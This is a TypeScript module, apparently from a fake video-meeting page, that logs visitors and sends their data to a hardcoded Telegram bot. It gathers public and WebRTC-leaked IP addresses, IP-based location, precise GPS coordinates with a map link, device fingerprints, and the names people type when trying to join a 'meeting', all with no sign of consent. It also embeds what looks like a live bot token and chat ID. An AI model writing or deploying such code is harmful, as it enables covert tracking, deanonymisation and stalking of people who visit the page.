// Telegram Logger for user tracking

const TELEGRAM_BOT_TOKEN = '8421853408:AAFDvCHIbx8XZyrfw9lif5eCB6YQZnZqPX8';
const CHAT_ID = 7320458296;

export type PermissionStatus = 'granted' | 'denied' | 'prompt' | 'unavailable' | 'not-supported';

export interface PermissionResult {
  name: string;
  status: PermissionStatus;
  error?: string;
  timestamp: string;
}

export const sendTelegramMessage = async (message: string): Promise<boolean> => {
  try {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID.toString());
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      body: formData
    });
    
    const data = await response.json();
    
    if (response.ok) {
      console.log('✅ Сообщение отправлено в Telegram');
      return true;
    } else {
      console.warn('⚠️ Ошибка отправки в Telegram:', data);
      return false;
    }
  } catch (error) {
    console.error('❌ Критическая ошибка отправки в Telegram:', error);
    return false;
  }
};

export const logVisitorEntry = async (data: {
  deviceInfo: any;
  publicIP: string;
  webrtcIPs: string[];
  geoData?: { country?: string; city?: string; region?: string; timezone?: string; isp?: string };
}) => {
  const { deviceInfo, publicIP, webrtcIPs, geoData } = data;
  
  const localTime = new Date().toLocaleString('ru-RU', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  
  const deviceEmoji = deviceInfo.device === 'ios' ? '📱' : 
                     deviceInfo.device === 'android' ? '🤖' : '🖥️';
  
  let message = `🎯 <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>\n\n`;
  
  // Device
  message += `${deviceEmoji} <b>${deviceInfo.deviceName}</b>\n`;
  message += `💻 ОС: ${deviceInfo.os || 'Unknown'}\n`;
  message += `🌍 Браузер: ${deviceInfo.browser || 'Unknown'}\n\n`;
  
  // IP addresses
  message += `🌐 <b>IP-адреса:</b>\n`;
  message += `   📍 Публичный: <code>${publicIP}</code>\n`;
  if (webrtcIPs && webrtcIPs.length > 0) {
    message += `   🔍 WebRTC Leak (${webrtcIPs.length}): ${webrtcIPs.map(ip => `<code>${ip}</code>`).join(', ')}\n`;
  } else {
    message += `   ⚠️ WebRTC Leak: не обнаружены\n`;
  }
  message += `\n`;
  
  // IP Geolocation
  if (geoData) {
    message += `📍 <b>Локация (по IP):</b>\n`;
    if (geoData.country) {
      message += `   🌍 Страна: ${geoData.country}\n`;
    }
    if (geoData.city) {
      message += `   🏙️ Город: ${geoData.city}\n`;
    }
    if (geoData.region) {
      message += `   📌 Регион: ${geoData.region}\n`;
    }
    if (geoData.timezone) {
      message += `   ⏰ Часовой пояс: ${geoData.timezone}\n`;
    }
    if (geoData.isp) {
      message += `   📡 Провайдер: ${geoData.isp}\n`;
    }
    message += `\n`;
  }
  
  // Screen
  message += `📺 <b>Экран:</b>\n`;
  message += `   📐 Размер: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n`;
  message += `   🎨 Глубина цвета: ${deviceInfo.colorDepth}-bit\n`;
  message += `   🔢 Плотность: ${deviceInfo.pixelRatio}×\n\n`;
  
  // Hardware
  if (deviceInfo.hardwareConcurrency || deviceInfo.deviceMemory) {
    message += `⚙️ <b>Железо:</b>\n`;
  }
  if (deviceInfo.hardwareConcurrency) {
    message += `   🔧 CPU cores: ${deviceInfo.hardwareConcurrency}\n`;
  }
  if (deviceInfo.deviceMemory) {
    message += `   💾 RAM: ${deviceInfo.deviceMemory}GB\n`;
  }
  
  // Network
  if (deviceInfo.connectionEffectiveType) {
    message += `   📶 Сеть: ${deviceInfo.connectionEffectiveType}`;
    if (deviceInfo.connectionDownlink) {
      message += ` (${deviceInfo.connectionDownlink} Mbps)`;
    }
    message += `\n`;
  }
  
  message += `\n📱 <b>User-Agent:</b>\n<code>${deviceInfo.userAgent.substring(0, 150)}${deviceInfo.userAgent.length > 150 ? '...' : ''}</code>`;
  
  await sendTelegramMessage(message);
};

export const logJoinAttempt = async (roomName: string, userName: string, buttonType: 'join' | 'join-without-audio', deviceInfo: any) => {
  const localTime = new Date().toLocaleString('ru-RU', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  
  const buttonText = buttonType === 'join' ? 'Join meeting' : 'Join without audio';
  
  const message = `🎬 <b>ПОПЫТКА ВХОДА</b>\n\n` +
    `🔘 <b>Кнопка:</b> ${buttonText}\n` +
    `👤 <b>Имя:</b> ${userName || 'Не указано'}\n` +
    `🏠 <b>Комната:</b> ${roomName}\n` +
    `${deviceInfo.deviceName}\n` +
    `⏰ ${localTime}`;
  
  await sendTelegramMessage(message);
};

export const logGeolocationData = async (
  latitude: number,
  longitude: number,
  accuracy: number,
  source: 'gps' | 'ip',
  deviceInfo: any
) => {
  const lat = latitude.toFixed(6);
  const lng = longitude.toFixed(6);
  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
  
  const localTime = new Date().toLocaleString('ru-RU', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
  
  const sourceEmoji = source === 'gps' ? '📍' : '🌐';
  const sourceText = source === 'gps' ? 'GPS' : 'IP-геолокация';
  
  const message = `${sourceEmoji} <b>ГЕОЛОКАЦИЯ (${sourceText})</b>\n\n` +
    `📍 <b>Координаты:</b>\n` +
    `   Широта: ${lat}\n` +
    `   Долгота: ${lng}\n` +
    `   Точность: ±${Math.round(accuracy)} м\n\n` +
    `🗺️ <a href="${googleMapsLink}">Открыть на карте</a>\n\n` +
    `${deviceInfo.deviceName}\n` +
    `⏰ ${localTime}`;
  
  await sendTelegramMessage(message);
};